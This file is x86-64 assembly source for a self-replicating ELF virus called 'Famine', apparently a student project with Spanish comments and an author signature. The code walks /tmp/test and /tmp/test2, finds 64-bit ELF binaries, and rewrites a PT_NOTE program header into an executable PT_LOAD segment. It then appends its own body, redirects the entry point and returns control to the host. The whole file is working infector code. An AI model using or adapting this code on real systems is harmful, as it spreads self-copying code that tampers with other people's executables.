%include "inc/famine.inc"

default rel
; _dummy_host_entrypoint:
;     mov rax, SC_EXIT
;     xor rdi, rdi
;     syscall
section .text
    ; Trazas
    dir db              "[+] dir",10,0  ;9

    global _start

    _start:
        PUSH_ALL
        push rsp
        ; this trick allows us to access Famine members using the VAR macro
        mov rbp, rsp
        sub rbp, Famine_size            ; allocate Famine struct on stack

        ; load virus entry
        lea rax, _start
        mov VAR(Famine.virus_entry), rax

        ; load virus size
        lea rax, _start
        lea rbx, _finish
        sub rbx, rax
        mov dword VAR(Famine.virus_size), ebx

        ;load dirs
        lea rdi, [dirs]

    .open_dir:

        ; save dirname pointer to iterate after
        mov VAR(Famine.dir_name_pointer), rdi

        ; if (dirname == NULL), end
        cmp byte [rdi], 0
        je .exit

        ; open(rdi, O_RDONLY | O_DIRECTORY);
        mov rsi, O_RDONLY | O_DIRECTORY
        mov rax, SC_OPEN
        syscall
        test rax, rax
        jl .next_dir

        ; save fd
        mov VAR(Famine.fd_dir), rax

        ; get directory entry
        .dirent:

            ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
            mov rdi, VAR(Famine.fd_dir)
            lea rsi, VAR(Famine.dirent_struc)
            mov rdx, 1024
            mov rax, SC_GETDENTS64
            syscall
            test rax, rax
            jle .close_dir

            xor r12, r12

        ; getdents64 does not return one directory entry. It returns as many directory entries as it can
        ; fit in the buffer passed. This is why the following iteration checks N directory entries and not just one.

        ; rdi = dirent_struct[0]
        ; r12 = offset from dirent_struct[0]
        ; rax = total bytes read in getdents
        .check_for_files_in_dirents:

            ; if offset == total_bytes, next entry.
            cmp r12, rax
            jge .dirent

            ; shift offset from the start of the dirent struct array
            lea rdi, VAR(Famine.dirent_struc)
            add rdi, r12

            ; add lenght of directory entry to offset
            movzx ecx, word [rdi + dirent.d_len]
            add r12, rcx

            ; check if the file is DT_REG
            cmp byte [rdi + dirent.d_type], DT_REG
            jne .check_for_files_in_dirents

            add rdi, dirent.d_name

            .openat:
                ; ?? pq se pushea el rax aqui ?
                push rax

                ; openat(fd_dir, d_name (&rsi), O_RDWR);
                lea rsi, [rdi]
                mov rdi, VAR(Famine.fd_dir)
                mov rdx, O_RDWR
                mov rax, SC_OPENAT
                syscall
                test rax, rax
                jle .skip_file

                mov VAR(Famine.fd_file), rax

            .fstat:

                sub rsp, 144                ;fstat struct buffer
                mov rdi, rax
                lea rsi, [rsp]
                mov rax, SC_FSTAT
                syscall
                test rax, rax
                jl .end_fstat

                ; file type
                mov eax, dword [rsp + 24]   ; st-mode fstat struct
                and eax, S_IFMT             ; bytes file type
                cmp eax, S_IFREG            ; reg file type
                jne .close_file
                mov rax, [rsp + 48]
                mov dword VAR(Famine.file_original_len), eax

                jmp .check_ehdr

                .end_fstat:
                    add rsp, 144
                    jmp .close_file

            .check_ehdr:
                add rsp, 144                    ; deallocate fstat struct from stack

                ; read(fd_file, rsi, 64);
                mov rdi, VAR(Famine.fd_file)
                sub rsp, Elf64_Ehdr_size        ; alloc sizeof(Elf64_Ehdr) on stack
                lea rsi, [rsp]                  ; rsi = &rsp
                mov rdx, Elf64_Ehdr_size
                mov rax, SC_READ
                syscall

                cmp dword [rsp], MAGIC_NUMBERS           ; magic number
                jne .check_ehdr_error

                cmp byte [rsp + 4], 2     ; EI_CLASS = 64 bits
                jne .check_ehdr_error

                cmp byte [rsp + 5], 1     ; EI_DATA = little endian
                jne .check_ehdr_error

                add rsp, Elf64_Ehdr_size
                jmp .mmap

                .check_ehdr_error:
                    add rsp, Elf64_Ehdr_size
                    jmp .close_file

            .mmap:
                TRACE_TEXT hello, 11
                ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
                mov eax, dword VAR(Famine.file_original_len)
                ; align current size to end at 4K page so our payload is aligned by writing it
                ; at the end.
                ALIGN rax
                mov ecx, dword VAR(Famine.virus_size)
                add rax, rcx

                ; save aligned size of file + virus size.
                mov dword VAR(Famine.file_final_len), eax

                ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
                mov rdi, 0x0
                mov rsi, rax
                mov rdx, PROT_READ | PROT_WRITE
                mov r10, MAP_SHARED
                mov r8, VAR(Famine.fd_file)
                mov r9, 0x0
                mov rax, SC_MMAP
                syscall
                test rax, rax
                jle .close_file
                mov VAR(Famine.mmap_ptr), rax   ; save mmap_ptr

            .check_infect:
                mov rcx, dword Traza_position
                mov rsi, rax
                movzx rbx, dword VAR(Famine.file_original_len)
                add rsi, rbx
                sub rsi, rcx
                lea rdi, Traza
                mov rcx, 20
                cld
                rep cmpsb
                je .munmap


            .infect:

                mov rbx, [rax + Elf64_Ehdr.e_entry] ; rbx = &(rax + e_entry)
                mov VAR(Famine.original_entry), rbx ; save original_entry

                lea rbx, [rax + Elf64_Ehdr.e_phoff] ; rbx = &(rax + e_phoff)
                mov rbx, [rbx]                      ; rbx = rax + *(rbx)
                add rbx, rax
                movzx eax, word [rax + Elf64_Ehdr.e_phnum]

                ; initialize variables seeked in loop header
                xor ecx, ecx
                mov VAR(Famine.note_phdr_ptr), rcx
                mov VAR(Famine.max_vaddr_end), rcx

                ;rax = phnum
                ;rbx = phdr_pointer

                .loop_phdr:
                    cmp rax, 0
                    jle .end_loop_phdr
                    ; lo que sea de rbx

                    cmp dword [rbx], 0x01 ;PT_LOAD
                    je .compute_max_vaddr_end

                    cmp dword [rbx], 0x04 ;PT_NOTE
                    je .assign_pt_note_phdr

                    jne .next_phdr
                    ;cmp dword [rbx + Elf64_Phdr.p_align], 0x4
                    ;jne .next_phdr
                    jmp .end_loop_phdr

                .assign_pt_note_phdr:

                    cmp qword VAR(Famine.note_phdr_ptr), 0x0
                    jne .next_phdr
                    mov VAR(Famine.note_phdr_ptr), rbx
                    jmp .next_phdr

                .compute_max_vaddr_end:
                    ; r8 = p_vaddr + p_memsz
                    mov r8, [rbx+Elf64_Phdr.p_vaddr]
                    add r8, [rbx+Elf64_Phdr.p_memsz]

                    ; if p_vaddr + p_memsz > max_vaddr_end:
                    cmp r8, VAR(Famine.max_vaddr_end)
                    jl .next_phdr

                    ; save new max_vaddr_end
                    mov VAR(Famine.max_vaddr_end), r8

                .next_phdr:
                    dec rax
                    add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
                    jmp .loop_phdr

                .end_loop_phdr:

                    cmp qword VAR(Famine.note_phdr_ptr), 0x0
                    je .close_file

                    cmp qword VAR(Famine.max_vaddr_end), 0x0
                    je .close_file

                .ftruncate:

                    ; TRACE_TEXT hello, 11

                    ; ftruncate(fd_file, file_final_len)
                    mov rdi, VAR(Famine.fd_file)
                    xor rsi, rsi
                    mov esi, dword VAR(Famine.file_final_len)
                    mov rax, SC_FTRUNCATE
                    syscall


                ; TEST DE ESCRITURA EN FINAL DE FICHERO.
                ; for ff in /tmp/test{,2}/*; do [ ! -d $ff ] && [ -f $ff ] && hexdump -C $ff | tail -2; done
                .test_escritura:
                    ; ---> miras si aparecen tres A
                    mov rax, VAR(Famine.mmap_ptr)
                    mov ecx, dword VAR(Famine.file_final_len)
                    dec rcx               ; penúltimo byte
                    add rax, rcx          ; rax = mmap_ptr + total_size - 1

                    mov byte [rax], 65    ; escribir 'A'
                    mov byte [rax-1], 65    ; escribir 'A'
                    mov byte [rax-2], 65    ; escribir 'A'

                .mod_pt_note:

                    ; Famine.note_phdr_ptr es una dirección de memoria que apunta a un puntero
                    lea rax, VAR(Famine.note_phdr_ptr)
                    mov rax, [rax]
                    mov [rax], dword 0x01                    ; p_type = PT_LOAD
                    mov [rax+Elf64_Phdr.p_flags], dword 0x05 ; p_flags = PF_X | PF_R

                    mov ecx, dword VAR(Famine.file_final_len)
                    sub ecx, dword VAR(Famine.virus_size)
                    mov [rax+Elf64_Phdr.p_offset], rcx       ; p_offset = file_final_len - virus_size
                    mov VAR(Famine.virus_offset), rcx

                    mov rcx, VAR(Famine.max_vaddr_end)
                    ALIGN rcx
                    mov [rax+Elf64_Phdr.p_vaddr], rcx        ; p_vaddr = ALIGN(max_pvaddr_len)
                    mov [rax+Elf64_Phdr.p_paddr], rcx        ; p_paddr = p_vaddr
                    mov VAR(Famine.new_entry), rcx

                    mov ecx, dword VAR(Famine.virus_size)
                    mov [rax+Elf64_Phdr.p_filesz], rcx       ; p_filesz = virus_size
                    mov [rax+Elf64_Phdr.p_memsz], rcx        ; p_memsz = virus_size

                    mov qword [rax+Elf64_Phdr.p_align], 0x1000     ; p_align = 0x1000 (4KB)

                .write_payload:
                    mov rsi, VAR(Famine.virus_entry)
                    mov rdi, VAR(Famine.mmap_ptr)
                    add rdi, VAR(Famine.virus_offset)

                    ; nos guardamos el address del mmap que se corresponde con el principio
                    ; del virus, movsb modifica este valor.
                    push rdi

                    mov ecx, dword VAR(Famine.virus_size)
                    cld
                    rep movsb

                    pop rdi

                    ; Patch host_entrypoint en el mmap con el entrypoint original
                    mov rax, VAR(Famine.original_entry)
                    mov [rdi + (host_entrypoint - _start)], rax

                    ; Patch virus_vaddr en el mmap con el nuevo entrypoint
                    mov rax, VAR(Famine.new_entry)
                    mov [rdi + (virus_vaddr - _start)], rax

                    ; Cambiar e_entry en el ELF Header
                    mov rax, VAR(Famine.mmap_ptr)
                    mov rbx, VAR(Famine.new_entry)
                    mov [rax + Elf64_Ehdr.e_entry], rbx

                .munmap:
                    ;munmap(map_ptr, )
                    mov rdi, VAR(Famine.mmap_ptr)
                    mov esi, dword VAR(Famine.file_final_len)
                    mov rax, SC_UNMAP
                    syscall

                    ; cambiar tamaños
                    ; lo que sea

                .close_file:
                ; TODO llamar al munmap antes de cerrar el fd.
                mov rdi, VAR(Famine.fd_file)
                mov rax, SC_CLOSE
                syscall

        .skip_file:
            pop rax
            jmp .check_for_files_in_dirents

        .close_dir:
            mov rax, SC_CLOSE
            mov rdi, VAR(Famine.fd_dir)
            syscall

        .next_dir:
            mov rsi, VAR(Famine.dir_name_pointer)

        .find_null:
            lodsb               ; al = *rsi++
            test al, al
            jnz .find_null

            mov rdi, rsi
            cmp byte [rdi], 0   ; find double null
            jnz .open_dir

        .jump_to_host:
            mov rsp, rbp
            add rsp, Famine_size
            pop rsp
            POP_ALL

            ; Calcular dirección de retorno
            lea rax, [rel _start]        ; Dirección absoluta de _start ahora mismo
            sub rax, [rel virus_vaddr]   ; Base real (Absoluta - Virtual)
            add rax, [rel host_entrypoint]    ; Dirección host (Base + Offset)

            jmp rax

        .exit:
        _dummy_host_entrypoint:

            mov rax, SC_EXIT
            xor rdi, rdi
            syscall

        dirs db         "/tmp/test",0,"/tmp/test2",0,0
        Traza_position equ _finish - Traza
        Traza db         "tomartin & carce-bo",0  ;20
        hello db            "[+] Hello",10,0  ;11
        host_entrypoint  dq   _dummy_host_entrypoint
        virus_vaddr dq   _start
    _finish:
